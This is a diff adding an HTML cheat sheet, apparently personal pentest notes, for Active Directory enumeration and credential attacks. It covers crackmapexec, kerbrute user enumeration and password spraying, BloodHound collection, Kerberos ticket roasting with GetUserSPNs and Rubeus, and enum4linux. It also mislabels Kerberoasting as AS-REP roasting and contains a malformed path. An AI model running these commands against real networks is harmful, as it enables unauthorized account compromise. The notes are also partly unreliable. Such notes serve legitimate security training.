@@ -1,0 +1,50 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Enumeration</title>
+</head><body><b>Check Smb Signing <br/>
+</b><br/>
+crackmapexec smb &lt;victim ip&gt;<b><br/>
+</b><b><br/>
+<br/>
+Gathering Username<br/>
+&gt;&gt; learn pre-procesing text with vim (TOMNOM)<br/>
+<br/>
+<br/>
+</b><b>Kerbrute (</b>https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64<b>)<br/>
+</b>(kerberos's services are running)<br/>
+&gt;&gt; make sure attacker clock with victim clock is same (<b>sudo ntpdate &lt;ntp server&gt;)</b><br/>
+<br/>
+./kerbrute userenum --dc &lt;dc ip&gt; -d &lt;domain&gt; users.txt<br/>
+<b><br/>
+<br/>
+</b><b>./kerbrute passwordspray </b>--dc &lt;dc ip&gt; -d &lt;domain&gt; users.txt &lt;password&gt;<b><br/>
+</b><b><br/>
+<br/>
+<br/>
+try login<br/>
+<br/>
+crackmapexec smb ...<br/>
+crackmapexec winrm ...<br/>
+python3 bloodhound.py -u &lt;username&gt; -p &lt;password&gt; -d &lt;domain&gt; -ns &lt;victim ip&gt; -c All<br/>
+<br/>
+<br/>
+ASP-REP Roasting attack<br/>
+<br/>
+</b>GetUserSPNs -dc-ip &lt;IP DC&gt; -request '&lt;domain' -format hashcat<br/>
+GetuserSPNs &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; &nbsp;[-outputfile krbrst.txt]<br/>
+<br/>
+Rubeus.exe asreproast /format:hashcat /outfile:C:temphash.txt<b><br/>
+</b><b><br/>
+<br/>
+</b><b>Enum4linux</b><br/>
+<br/>
+enum4linux &lt;ip machine&gt;<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<br/>
+</body></html>
